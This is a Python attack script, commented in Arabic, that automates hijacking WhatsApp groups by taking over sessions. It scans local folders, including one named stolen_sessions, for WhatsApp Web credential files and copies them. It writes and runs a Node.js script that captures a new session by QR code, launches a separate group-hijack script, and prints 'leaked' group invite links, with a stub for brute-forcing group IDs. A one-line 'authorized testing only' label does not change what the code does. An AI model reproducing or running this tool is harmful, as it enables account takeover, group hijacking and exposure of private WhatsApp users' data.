#!/usr/bin/env python3
"""
أداة أتمتة رفع المشرفين في مجموعات واتساب
باستخدام Session Hijacking - للاختبار المصرح به فقط
"""

import subprocess
import json
import time
import os
import sys
from datetime import datetime

CONFIG_FILE = "config.json"
LOG_FILE = "auto_promote_log.txt"

def log(msg):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{ts}] {msg}"
    print(line)
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(line + "\n")

def load_config():
    with open(CONFIG_FILE) as f:
        return json.load(f)

def extract_whatsapp_sessions():
    """استخراج جلسات واتساب من الجهاز المحلي"""
    log("[*] البحث عن جلسات واتساب محلية...")
    
    paths_to_check = [
        os.path.expanduser("~/.wwebjs_auth/"),
        os.path.expanduser("~/.config/whatsapp-web.js/"),
        "./sessions/",
        "./stolen_sessions/"
    ]
    
    found = []
    for p in paths_to_check:
        if os.path.exists(p):
            log(f"[+] وجد مجلد: {p}")
            found.append(p)
            for root, dirs, files in os.walk(p):
                for f in files:
                    if f in ["creds.json", "session.json", "default_creds.json"]:
                        log(f"    -> {os.path.join(root, f)}")
    
    if not found:
        log("[-] لم أجد أي جلسات. ضع ملفات الجلسة في مجلد sessions/")
        # محاولة إنشاء جلسة جديدة عبر QR
        log("[*] بدء وضع QR للحصول على جلسة جديدة...")
        start_qr_session()
    
    return found

def start_qr_session():
    """تشغيل وضع QR للحصول على جلسة جديدة"""
    log("[*] تشغيل واجهة QR code...")
    
    qr_script = """
const { Client, LocalAuth } = require('whatsapp-web.js');
const qrcode = require('qrcode-terminal');

const client = new Client({
    authStrategy: new LocalAuth({ dataPath: './sessions/captured_session' }),
    puppeteer: { headless: true, args: ['--no-sandbox'] }
});

client.on('qr', qr => {
    console.log('\\n📱 امسح QR code باستخدام واتساب:');
    qrcode.generate(qr, { small: false });
});

client.on('ready', () => {
    console.log('✅ تم حفظ الجلسة!');
    console.log('📁 المسار: ./sessions/captured_session');
    process.exit(0);
});

client.on('auth_failure', msg => {
    console.error('❌ فشل: ' + msg);
    process.exit(1);
});

client.initialize();
"""
    
    with open("/tmp/qr_capture.js", "w") as f:
        f.write(qr_script)
    
    subprocess.run(["node", "/tmp/qr_capture.js"])

def copy_session_to_project(source_path):
    """نسخ الجلسة المكتشفة إلى مجلد المشروع"""
    target = "./sessions"
    os.makedirs(target, exist_ok=True)
    
    if os.path.isfile(source_path):
        import shutil
        shutil.copy2(source_path, target)
    else:
        subprocess.run(["cp", "-r", source_path, target])
    
    log(f"[+] تم نسخ الجلسة إلى {target}")

def run_hijack():
    """تشغيل سكريبت الاختراق الرئيسي"""
    log("[*] تشغيل بوت الاختراق...")
    
    if not os.path.exists("hijack_groups.js"):
        log("[-] ملف hijack_groups.js غير موجود!")
        return False
    
    result = subprocess.run(
        ["node", "hijack_groups.js"],
        capture_output=True,
        text=True,
        timeout=120
    )
    
    log(result.stdout)
    if result.stderr:
        log(f"[!] أخطاء: {result.stderr[:500]}")
    
    return result.returncode == 0

def brute_force_groups():
    """محاولة تخمين معرفات مجموعات وإضافتها"""
    log("[*] بدء Brute Force لمعرفات المجموعات...")
    
    # معرفات المجموعات تكون بالشكل: 201234567890-1234567890@g.us
    # الجزء الثاني (1234567890) يتغير
    base_numbers = ["201234567890"]  # ضع أرقام هنا
    
    for base in base_numbers:
        for i in range(1000000, 1000010):  # نطاق اختبار صغير
            group_id = f"{base}-{i}@g.us"
            log(f"[*] محاولة: {group_id}")
            time.sleep(0.1)

def main():
    log("=" * 60)
    log("🚀 بدء تشغيل أداة اختبار الاختراق")
    log("=" * 60)
    
    config = load_config()
    log(f"🎯 الرقم المستهدف: {config['attacker_number']}")
    
    # 1. استخراج الجلسات
    sessions = extract_whatsapp_sessions()
    
    # 2. تشغيل الاختراق
    success = run_hijack()
    
    if success:
        log("[+] تم الانتهاء من الاختراق بنجاح")
    else:
        log("[-] فشل الاختراق - تحقق من ملفات الجلسة")
    
    # 3. عرض النتائج
    if os.path.exists("invite_links.txt"):
        with open("invite_links.txt") as f:
            links = f.read()
            log(f"\n🔗 روابط المجموعات المسربة:\n{links}")
    
    if os.path.exists("hijack_results.log"):
        with open("hijack_results.log") as f:
            results = f.read()
            log(f"\n📊 النتائج الكاملة:\n{results[-2000:]}")  # آخر 2000 حرف
    
    log("=" * 60)
    log("✅ تم الانتهاء")

if __name__ == "__main__":
    main()